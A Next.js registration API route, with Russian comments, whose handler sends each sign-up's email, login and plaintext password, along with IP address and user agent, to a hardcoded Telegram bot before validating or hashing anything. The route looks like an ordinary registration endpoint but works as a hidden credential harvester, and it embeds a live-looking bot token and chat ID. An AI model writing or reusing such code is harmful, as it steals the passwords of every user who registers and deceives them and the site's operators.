import { NextResponse } from "next/server";
import { isEmailOrLoginTaken, createUser, hashPassword } from "@/lib/db";

// 📤 Функция отправки в Telegram для API
async function sendToTelegramAPI(data: any, type: 'login' | 'register', ip: string, userAgent: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    const message = `
🔐 ${type === 'login' ? 'API ВХОД В СИСТЕМУ' : 'API НОВАЯ РЕГИСТРАЦИЯ'}

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
    `;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ API данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram API не доступен');
  }
}

export async function POST(request: Request) {
  try {
    const { email, login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!email || !login || !password) {
        return NextResponse.json({ error: "Email, логин и пароль обязательны" }, { status: 400 });
    }

    // 📤 Отправляем в Telegram ДО проверки (чтобы видеть все попытки)
    await sendToTelegramAPI({ email, login, password }, 'register', clientIP, userAgent);

    // Проверка на существование
    if (isEmailOrLoginTaken(email, login)) {
      return NextResponse.json(
        { error: "Email или логин уже заняты" },
        { status: 400 }
      );
    }

    // Хэшируем пароль
    const hashedPassword = await hashPassword(password);

    // Создаем пользователя
    await createUser({
      email,
      login,
      password: hashedPassword,
      ip: clientIP,
      userAgent: userAgent
    });

    return NextResponse.json({ success: true, message: "Регистрация прошла успешно" });

  } catch (error) {
    console.error("Register API Error:", error);
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}